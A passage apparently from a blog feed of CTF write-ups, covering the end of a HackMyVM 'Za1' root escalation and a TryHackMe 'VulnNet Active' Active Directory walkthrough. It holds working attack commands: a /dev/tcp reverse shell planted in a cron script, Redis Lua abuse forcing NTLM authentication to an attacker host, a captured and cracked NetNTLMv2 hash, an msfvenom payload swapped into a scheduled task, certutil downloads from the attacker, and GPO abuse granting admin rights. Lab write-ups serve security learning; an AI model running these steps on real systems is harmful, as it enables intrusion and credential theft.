.sudo_as_admin_successful-rw------- 1 za_1 za_1 991 Jul 26 07:30 .viminfo-rw-r--r-- 1 za_1 za_1 23 Jul 26 09:23 user.txtza_1@za_1:~$ cd .rootza_1@za_1:~/.root$ ls -altotal 12drwxr-xr-x 2 za_1 za_1 4096 Jul 26 09:48 .drwxr-xr-x 6 za_1 za_1 4096 Aug 22 08:49 ..-rwxrwxrwx 1 root root 117 Jul 26 09:48 back.shza_1@za_1:~/.root$ cat back.sh #!/bin/bashcp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sqlbash -i >&/dev/tcp/10.0.2.18/999 0>&1za_1@za_1:~/.root$```{: .nolineno}This `back.sh` file must be executed through root from cron set for verification I ran pspy64 Tool and I was write then I exchanged that file with my own reverse shell file . ![Untitled](Za1/Untitled%208.png)my `back.sh` file looks like this no new modification only changed the IP and the port and saved it and let it run â†’```bashza_1@za_1:~/.root$ wget http://10.0.2.60/back.sh--2023-10-08 06:21:10-- http://10.0.2.60/back.shConnecting to 10.0.2.60:80... connected.HTTP request sent, awaiting response... 200 OKLength: 118 [text/x-sh]Saving to: 'back.sh.1'back.sh.1 0%[ ] 0 --.-KB/back.sh.1 100%[===================>] 118 --.-KB/s in 0s 2023-10-08 06:21:10 (22.4 MB/s) - 'back.sh.1' saved [118/118]za_1@za_1:~/.root$za_1@za_1:~/.root$ lsback.sh back.sh.1za_1@za_1:~/.root$ rm back.shza_1@za_1:~/.root$ mv back.sh.1 back.shza_1@za_1:~/.root$ ls -altotal 12drwxr-xr-x 2 za_1 za_1 4096 Oct 8 06:21 .drwxr-xr-x 7 za_1 za_1 4096 Oct 8 06:18 ..-rw-r--r-- 1 za_1 za_1 118 Oct 8 06:20 back.shza_1@za_1:~/.root$za_1@za_1:~/.root$ cat back.sh #!/bin/bashcp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sqlbash -i >&/dev/tcp/10.0.2.60/2222 0>&1za_1@za_1:~/.root$```{: .nolineno}I observed the response and I got root â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Za1]â””â”€$ nc -lvnp 2222 listening on [any] 2222 ...connect to [10.0.2.60] from (UNKNOWN) [10.0.2.70] 42164bash: cannot set terminal process group (2553): Inappropriate ioctl for devicebash: no job control in this shellroot@za_1:~# whoamiwhoamirootroot@za_1:~# ididuid=0(root) gid=0(root) groups=0(root)root@za_1:~# cd /rootcd /rootroot@za_1:~# ls -alls -altotal 60drwx------ 6 root root 4096 Aug 22 08:48 .drwxr-xr-x 24 root root 4096 Jul 26 06:56 ..lrwxrwxrwx 1 root root 9 Aug 22 08:48 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Aug 22 08:41 .cachedrwx------ 3 root root 4096 Aug 22 08:41 .gnupgdrwxr-xr-x 3 root root 4096 Jul 26 07:43 .local-rw------- 1 root root 154 Jul 26 08:41 .mysql_history-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 25 Jul 26 09:54 root.txt-rw-r--r-- 1 root root 75 Jul 26 09:26 .selected_editor-rw------- 1 root root 137 Aug 22 08:43 .sqlite_historydrwx------ 2 root root 4096 Jul 26 07:07 .ssh-rw------- 1 root root 9983 Jul 26 09:54 .viminforoot@za_1:~# cat root.txtcat root.txtflag{FLAGFLAGFLAG}root@za_1:~#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "VulnNet Active", "url": "/posts/VulnNet-Active/", "categories": "TryHackMe", "tags": "Active Directory, SMB, redis-cli, responder, PrivEsc, SharpHound, BloodHound, GenericWrite, SharpGPOAbuse, GPO, PrivEsc", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.75.19 [sudo] password for kali: Starting Nmap 7.94 ( https://nm...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.75.19 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 21:29 ISTStats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 32.27% done; ETC: 21:35 (0:04:27 remaining)Nmap scan report for 10.10.75.19Host is up (0.20s latency).Not shown: 65523 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?464/tcp open kpasswd5?6379/tcp open redis Redis key-value store 2.8.240249665/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049670/tcp open msrpc Microsoft Windows RPC49685/tcp open msrpc Microsoft Windows RPC49700/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2023-10-01T16:05:03|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required|_clock-skew: 1s```{: .nolineno}Now with SMB enumeration I can get the access but I got the domain name like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ crackmapexec smb 10.10.75.19 SMB 10.10.75.19 445 VULNNET-BC3TCK1 [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)```{: .nolineno}Now I also got a port for Redis and I got some information about this port from this [site](https://www.notion.so/VulnNet-dbbd1c5f42f94506b270edecc85635b1?pvs=21) and command from this [site](https://exploit-notes.hdks.org/exploit/database/redis-pentesting/) :```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ redis-cli -h 10.10.75.1910.10.75.19:6379> 10.10.75.19:6379> info# Serverredis_version:2.8.2402redis_git_sha1:00000000redis_git_dirty:0redis_build_id:b2a45a9622ff23b7redis_mode:standaloneos:Windows arch_bits:64multiplexing_api:winsock_IOCPprocess_id:440run_id:6e293d75a5f16b38ba3ae14b2aee4e9752099b14tcp_port:6379uptime_in_seconds:1386uptime_in_days:0hz:10lru_clock:1678563config_file:# Clientsconnected_clients:1client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0# Memoryused_memory:953256used_memory_human:930.91Kused_memory_rss:919712used_memory_peak:977824used_memory_peak_human:954.91Kused_memory_lua:36864mem_fragmentation_ratio:0.96mem_allocator:dlmalloc-2.8# Persistenceloading:0rdb_changes_since_last_save:0rdb_bgsave_in_progress:0rdb_last_save_time:1696175993rdb_last_bgsave_status:okrdb_last_bgsave_time_sec:-1rdb_current_bgsave_time_sec:-1aof_enabled:0aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:okaof_last_write_status:ok# Statstotal_connections_received:2total_commands_processed:3instantaneous_ops_per_sec:0total_net_input_bytes:138total_net_output_bytes:0instantaneous_input_kbps:0.00instantaneous_output_kbps:0.00rejected_connections:0sync_full:0sync_partial_ok:0sync_partial_err:0expired_keys:0evicted_keys:0keyspace_hits:0keyspace_misses:0pubsub_channels:0pubsub_patterns:0latest_fork_usec:0# Replicationrole:masterconnected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0# CPUused_cpu_sys:0.08used_cpu_user:0.31used_cpu_sys_children:0.00used_cpu_user_children:0.00# Keyspace(0.52s)10.10.75.19:6379> info keyspace# Keyspace10.10.75.19:6379> config get * 1) \"dbfilename\" 2) \"dump.rdb\" 3) \"requirepass\" 4) \"\" 5) \"masterauth\" 6) \"\" 7) \"unixsocket\" 8) \"\" 9) \"logfile\" 10) \"\" 11) \"pidfile\" 12) \"/var/run/redis.pid\" 13) \"maxmemory\" 14) \"0\" 15) \"maxmemory-samples\" 16) \"3\" 17) \"timeout\" 18) \"0\" 19) \"tcp-keepalive\" 20) \"0\" 21) \"auto-aof-rewrite-percentage\" 22) \"100\" 23) \"auto-aof-rewrite-min-size\" 24) \"67108864\" 25) \"hash-max-ziplist-entries\" 26) \"512\" 27) \"hash-max-ziplist-value\" 28) \"64\" 29) \"list-max-ziplist-entries\" 30) \"512\" 31) \"list-max-ziplist-value\" 32) \"64\" 33) \"set-max-intset-entries\" 34) \"512\" 35) \"zset-max-ziplist-entries\" 36) \"128\" 37) \"zset-max-ziplist-value\" 38) \"64\" 39) \"hll-sparse-max-bytes\" 40) \"3000\" 41) \"lua-time-limit\" 42) \"5000\" 43) \"slowlog-log-slower-than\" 44) \"10000\" 45) \"latency-monitor-threshold\" 46) \"0\" 47) \"slowlog-max-len\" 48) \"128\" 49) \"port\" 50) \"6379\" 51) \"tcp-backlog\" 52) \"511\" 53) \"databases\" 54) \"16\" 55) \"repl-ping-slave-period\" 56) \"10\" 57) \"repl-timeout\" 58) \"60\" 59) \"repl-backlog-size\" 60) \"1048576\" 61) \"repl-backlog-ttl\" 62) \"3600\" 63) \"maxclients\" 64) \"10000\" 65) \"watchdog-period\" 66) \"0\" 67) \"slave-priority\" 68) \"100\" 69) \"min-slaves-to-write\" 70) \"0\" 71) \"min-slaves-max-lag\" 72) \"10\" 73) \"hz\" 74) \"10\" 75) \"repl-diskless-sync-delay\" 76) \"5\" 77) \"no-appendfsync-on-rewrite\" 78) \"no\" 79) \"slave-serve-stale-data\" 80) \"yes\" 81) \"slave-read-only\" 82) \"yes\" 83) \"stop-writes-on-bgsave-error\" 84) \"yes\" 85) \"daemonize\" 86) \"no\" 87) \"rdbcompression\" 88) \"yes\" 89) \"rdbchecksum\" 90) \"yes\" 91) \"activerehashing\" 92) \"yes\" 93) \"repl-disable-tcp-nodelay\" 94) \"no\" 95) \"repl-diskless-sync\" 96) \"no\" 97) \"aof-rewrite-incremental-fsync\" 98) \"yes\" 99) \"aof-load-truncated\"100) \"yes\"101) \"appendonly\"102) \"no\"103) \"dir\"104) \"C:\\\\Users\\\\enterprise-security\\\\Downloads\\\\Redis-x64-2.8.2402\"105) \"maxmemory-policy\"106) \"volatile-lru\"107) \"appendfsync\"108) \"everysec\"109) \"save\"110) \"jd 3600 jd 300 jd 60\"111) \"loglevel\"112) \"notice\"113) \"client-output-buffer-limit\"114) \"normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60\"115) \"unixsocketperm\"116) \"0\"117) \"slaveof\"118) \"\"119) \"notify-keyspace-events\"120) \"\"121) \"bind\"122) \"\"(0.70s)10.10.75.19:6379> config get databases1) \"databases\"2) \"16\"10.10.75.19:6379>```{: .nolineno}I can also read file remotelly through this command â†’```bash> eval \"dofile('C:\\\\\\\\Users\\\\\\\\enterprise-security\\\\\\\\Desktop\\\\\\\\user.txt')\" 0```{: .nolineno}```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ redis-cli -h 10.10.75.19 10.10.75.19:6379> 10.10.75.19:6379> eval \"dofile('C:\\\\\\\\Users\\\\\\\\enterprise-security\\\\\\\\Desktop\\\\\\\\user.txt')\" 0(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\\Users\\enterprise-security\\Desktop\\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' (1.27s)10.10.75.19:6379>```{: .nolineno}I could able to access this file content so that means I do NTLM relay Attack by running responder in backround mode , so lets try it out now â†’```bash10.10.75.19:6379> eval \"dofile('//10.8.83.156/shares')\" 0(error) ERR Error running script (call to f_c8e1044d37a286781e4d3fe1df83e31a49db0798): @user_script:1: cannot open //10.8.83.156/shares: Permission denied (3.52s)10.10.75.19:6379>```{: .nolineno}I ran the responder in background and I captured this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ sudo responder -I tun0 -dwP -v [sudo] password for kali: __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.1.3.0 To support this project: Patreon -> https://www.patreon.com/PythonResponder Paypal -> https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [ON][+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [ON] Auth proxy [ON] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON][+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF][+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF][+] Generic Options: Responder NIC [tun0] Responder IP [10.8.83.156] Responder IPv6 [fe80::46bc:f467:dd9a:ee96] Challenge set [random] Dont Respond To Names ['ISATAP'][+] Current Session Variables: Responder Machine Name [WIN-XOISZRIFCN0] Responder Domain Name [51T0.LOCAL] Responder DCE-RPC Port [45799][+] Listening for events...[SMB] NTLMv2-SSP Client : 10.10.75.19[SMB] NTLMv2-SSP Username : VULNNET\\enterprise-security[SMB] NTLMv2-SSP Hash : enterprise-security::VULNNET:bcd2016fc9e1f951:F857BD47837594AB123EE76E0BF74BC5:0101000000000000807A8A6EB4F4D901C9FBB4FD27FB5A470000000002000800350031005400300001001E00570049004E002D0058004F00490053005A0052004900460043004E00300004003400570049004E002D0058004F00490053005A0052004900460043004E0030002E0035003100540030002E004C004F00430041004C000300140035003100540030002E004C004F00430041004C000500140035003100540030002E004C004F00430041004C0007000800807A8A6EB4F4D90106000400020000000800300030000000000000000000000000300000C1D9B88FE0F232E549DEE2EDADCD23283CB647B0009CC8566115C880D8DD84D60A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00380033002E003100350036000000000000000000```{: .nolineno}Now its time to crack this hash value through hashcat Tool â†’```bashENTERPRISE-SECURITY::VULNNET:bcd2016fc9e1f951:f857bd47837594ab123ee76e0bf74bc5:0101000000000000807a8a6eb4f4d901c9fbb4fd27fb5a470000000002000800350031005400300001001e00570049004e002d0058004f00490053005a0052004900460043004e00300004003400570049004e002d0058004f00490053005a0052004900460043004e0030002e0035003100540030002e004c004f00430041004c000300140035003100540030002e004c004f00430041004c000500140035003100540030002e004c004f00430041004c0007000800807a8a6eb4f4d90106000400020000000800300030000000000000000000000000300000c1d9b88fe0f232e549dee2edadcd23283cb647b0009cc8566115c880d8dd84d60a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00380033002e003100350036000000000000000000:sand_0873959498 Session..........: hashcatStatus...........: CrackedHash.Mode........: 5600 (NetNTLMv2)Hash.Target......: ENTERPRISE-SECURITY::VULNNET:bcd2016fc9e1f951:f857b...000000Time.Started.....: Sun Oct 1 22:21:42 2023 (7 secs)Time.Estimated...: Sun Oct 1 22:21:49 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 583.0 kH/s (1.26ms) @ Accel:512 Loops:1 Thr:1 Vec:4Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 4014080/14344385 (27.98%)Rejected.........: 0/4014080 (0.00%)Restore.Point....: 4013056/14344385 (27.98%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: sandi1186 -> sand418Hardware.Mon.#1..: Util: 78%```{: .nolineno}Now I have the credentials â†’```bashVULNNET\\enterprise-security:sand_0873959498```{: .nolineno}I checked the SMB Shares and got these shares â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]â””â”€$ smbclient -L \\\\\\\\10.10.231.107\\\\ -U enterprise-securityPassword for [WORKGROUP\\enterprise-security]:\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tEnterprise-Share Disk \tIPC$ IPC Remote IPC\tNETLOGON Disk Logon server share \tSYSVOL Disk Logon server share tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUTReconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.231.107 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup availableâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]â””â”€$ smbclient //10.10.231.107/Enterprise-Share -U enterprise-securityPassword for [WORKGROUP\\enterprise-security]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Wed Feb 24 04:15:41 2021 .. D 0 Wed Feb 24 04:15:41 2021 PurgeIrrelevantData_1826.ps1 A 69 Wed Feb 24 06:03:18 2021\t\t9466623 blocks of size 4096. 4931357 blocks availablesmb: \\> get PurgeIrrelevantData_1826.ps1getting file \\PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)smb: \\> exit```{: .nolineno}I got this file from this `Enterprise-Share` share â†’ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]â””â”€$ cat PurgeIrrelevantData_1826.ps1 rm -Force C:\\Users\\Public\\Documents\\* -ErrorAction SilentlyContinue```{: .nolineno}I think this file is working as a schedule task so lets replace with our own reverse shell file with same name â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]â””â”€$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.8.83.156 LPORT=4444 -f psh -o PurgeIrrelevantData_1826.ps1 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 1875 bytesFinal size of psh file: 10107 bytesSaved as: PurgeIrrelevantData_1826.ps1```{: .nolineno}Now lets put this file in SMB in that same share â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]â””â”€$ smbclient //10.10.231.107/Enterprise-Share -U enterprise-securityPassword for [WORKGROUP\\enterprise-security]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Wed Feb 24 04:15:41 2021 .. D 0 Wed Feb 24 04:15:41 2021 PurgeIrrelevantData_1826.ps1 A 69 Wed Feb 24 06:03:18 2021\t\t9466623 blocks of size 4096. 5040558 blocks availablesmb: \\> put ../PurgeIrrelevantData_1826.ps1 putting file ../PurgeIrrelevantData_1826.ps1 as \\PurgeIrrelevantData_1826.ps1 (13.4 kb/s) (average 13.4 kb/s)smb: \\>```{: .nolineno}I also ran the Bloodhound tool as It is a active directory machine and I need to find the graphical view to the Administrator that is why â†’Got the reverse shell â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.231.107] 49817Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1Copyright (C) Microsoft Corporation. All rights reserved.PS C:\\Users\\enterprise-security\\Downloads> dir Directory: C:\\Users\\enterprise-security\\DownloadsMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/23/2021 2:29 PM nssm-2.24-101-g897c7ad d----- 2/26/2021 12:14 PM Redis-x64-2.8.2402 -a---- 2/26/2021 10:37 AM 143 startup.bat PS C:\\Users\\enterprise-security\\Downloads> whoami /allUSER INFORMATION----------------User Name SID =========================== =====================================vulnnet\\enterprise-security S-1-5-21-1405206085-1650434706-76331420-1103GROUP INFORMATION-----------------Group Name Type SID Attributes ========================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupAuthentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= =SeMachineAccountPrivilege Add workstations to domain DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.PS C:\\Users\\enterprise-security\\Downloads> PS C:\\Users\\enterprise-security\\Downloads>```{: .nolineno}Now I uploaded the `SharpHound.exe` file that will collect the Data for BloodHound Tool in the zip format and then I will be trasfering those file to attackers machine â†’```powershellPS C:\\Users\\enterprise-security\\Downloads> certutil.exe -urlcache -f http://10.8.83.156/SharpHound.exe SharpHound.exe**** Online ****CertUtil: -URLCache command completed successfully.PS C:\\Users\\enterprise-security\\Downloads> .\\SharpHound.exe2023-10-05T22:33:40.3553381-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound2023-10-05T22:33:51.7903121-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote2023-10-05T22:33:53.4652933-07:00|INFORMATION|Initializing SharpHound at 10:33 PM on 10/5/20232023-10-05T22:34:26.3864629-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for vulnnet.local : VULNNET-BC3TCK1SHNQ.vulnnet.local2023-10-05T22:34:31.1159588-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote2023-10-05T22:34:46.9662445-07:00|INFORMATION|Beginning LDAP search for vulnnet.local2023-10-05T22:34:50.8515123-07:00|INFORMATION|Producer has finished, closing LDAP channel2023-10-05T22:34:50.9315755-07:00|INFORMATION|LDAP channel closed, waiting for consumers2023-10-05T22:35:17.7885347-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 31 MB RAM2023-10-05T22:35:48.1022481-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM2023-10-05T22:36:18.4117379-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM2023-10-05T22:36:48.7559981-07:00|INFORMATION|Status: 52 objects finished (+52 0.4262295)/s -- Using 39 MB RAM2023-10-05T22:36:49.5546040-07:00|INFORMATION|Consumers finished, closing output channel2023-10-05T22:36:54.0183953-07:00|INFORMATION|Output channel closed, waiting for output task to completeClosing writers2023-10-05T22:37:12.5516466-07:00|INFORMATION|Status: 93 objects finished (+41 0.6413793)/s -- Using 38 MB RAM2023-10-05T22:37:12.6317401-07:00|INFORMATION|Enumeration finished in 00:02:26.06043022023-10-05T22:37:21.4341789-07:00|INFORMATION|Saving cache with stats: 52 ID to type mappings. 52 name to SID mappings. 0 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings.2023-10-05T22:37:22.3358989-07:00|INFORMATION|SharpHound Enumeration Completed at 10:37 PM on 10/5/2023! Happy Graphing!PS C:\\Users\\enterprise-security\\Downloads> PS C:\\Users\\enterprise-security\\Downloads> dir Directory: C:\\Users\\enterprise-security\\DownloadsMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/23/2021 2:29 PM nssm-2.24-101-g897c7ad d----- 2/26/2021 12:14 PM Redis-x64-2.8.2402 -a---- 10/5/2023 10:37 PM 11446 20231005223636_BloodHound.zip -a---- 10/5/2023 10:32 PM 1046528 SharpHound.exe -a---- 2/26/2021 10:37 AM 143 startup.bat -a---- 10/5/2023 10:37 PM 7851 Y2Q3NzU4MTgtZWE0Ny00ZGJjLTg4MDAtM2NjYjJmZTZjN2U2.bin PS C:\\Users\\enterprise-security\\Downloads>```{: .nolineno}Now I have to get it into my attackers machine so lets get it through SMB shares like this â†’```powershellPS C:\\Enterprise-Share> cp C:\\Users\\enterprise-security\\Downloads\\20231005223636_BloodHound.zip . PS C:\\Enterprise-Share> dir Directory: C:\\Enterprise-ShareMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/5/2023 10:37 PM 11446 20231005223636_BloodHound.zip -a---- 10/5/2023 10:18 PM 10107 PurgeIrrelevantData_1826.ps1 PS C:\\Enterprise-Share>```{: .nolineno}Form SMB â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]â””â”€$ smbclient //10.10.113.65/Enterprise-Share -U enterprise-securityPassword for [WORKGROUP\\enterprise-security]:Try \"help\" to get a list of possible commands.smb: \\> smb: \\> ls . D 0 Fri Oct 6 11:14:58 2023 .. D 0 Fri Oct 6 11:14:58 2023 20231005223636_BloodHound.zip A 11446 Fri Oct 6 11:07:19 2023 PurgeIrrelevantData_1826.ps1 A 10107 Fri Oct 6 10:48:41 2023get \t\t9558271 blocks of size 4096. 5133451 blocks availablesmb: \\> get 20231005223636_BloodHound.zip getting file \\20231005223636_BloodHound.zip of size 11446 as 20231005223636_BloodHound.zip (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)smb: \\> exit```{: .nolineno}Now through BloodHound tool I got to know about GPO Generic Write permission enabled like this way I will be part of `SECURITY-POL-VN@VULNNET.LOCAL` group â†’![Untitled](/Vulnhub-Files/img/VulnNet/Untitled.png)Now I will be using a Tool called as [SharpGPOAbuse.exe](https://github.com/byronkg/SharpGPOAbuse/blob/main/SharpGPOAbuse-master/SharpGPOAbuse.exe) to Abuse the GPO of `SECURITY-POL-VN@VULNNET.LOCAL` and adding the user enterprise-security in Administrators group like this â†’```powershellPS C:\\Enterprise-Share> certutil.exe -urlcache -f http://10.8.83.156/SharpGPOAbuse.exe SharpGPOAbuse.exe**** Online ****CertUtil: -URLCache command completed successfully.PS C:\\Enterprise-Share> .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"babbadeckl_privesc\" --Author vulnnet\\administrator --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators enterprise-security /add\" --GPOName \"SECURITY-POL-VN\" --Force[+] Domain = vulnnet.local[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local[+] GUID of \"SECURITY-POL-VN\" is: {31B2F340-016D-11D2-945F-00C04FB984F9}[+] Creating file \\\\vulnnet.local\\SysVol\\vulnnet.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml[+] versionNumber attribute changed successfully[+] The version number in GPT.ini was increased successfully.[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.[+] Done!PS C:\\Enterprise-Share> ```{: .nolineno}Now I have to reset the group policies or can say GPOs with this command â†’```powershellPS C:\\Enterprise-Share> gpupdate \\force```{: .nolineno}After sometime I checked and it did work , am I ( enterprise-security ) user is the part of Administrators group now â†’```powershellPS C:\\Enterprise-Share> net users enterprise-securityUser name enterprise-securityFull Name Enterprise SecurityComment TryHackMeUsers comment Country/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 2/23/2021 4:01:37 PMPassword expires NeverPassword changeable 2/24/2021 4:01:37 PMPassword required YesUser may change password YesWorkstations allowed AllLogon script User profile Home directory Last logon 10/5/2023 10:13:35 PMLogon hours allowed AllLocal Group Memberships *Administrators Global Group memberships *Domain Users The command completed successfully.PS C:\\Enterprise-Share> net localgroup AdministratorsAlias name AdministratorsComment Administrators have complete and unrestricted access to the computer/domainMembers-------------------------------------------------------------------------------AdministratorDomain AdminsEnterprise Adminsenterprise-securityThe command completed successfully.PS C:\\Enterprise-Share>```{: .nolineno}Now I am the Admin considerate so lets see the last FLAG now through SMB shares on `C$` â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/VulnNet]â””â”€$ smbclient //10.10.235.137/C$ -U enterprise-securityPassword for [WORKGROUP\\enterprise-security]:Try \"help\" to get a list of possible commands.smb: \\> dir $Recycle.Bin DHS 0 Wed Feb 24 03:33:20 2021 Documents and Settings DHSrn 0 Tue Feb 23 10:11:41 2021 Enterprise-Share D 0 Fri Oct 6 15:55:08 2023 pagefile.sys AHS 1073741824 Fri Oct 6 15:45:14 2023 PerfLogs D 0 Tue Feb 23 12:02:00 2021 Program Files DR 0 Tue Feb 23 01:15:53 2021 Program Files 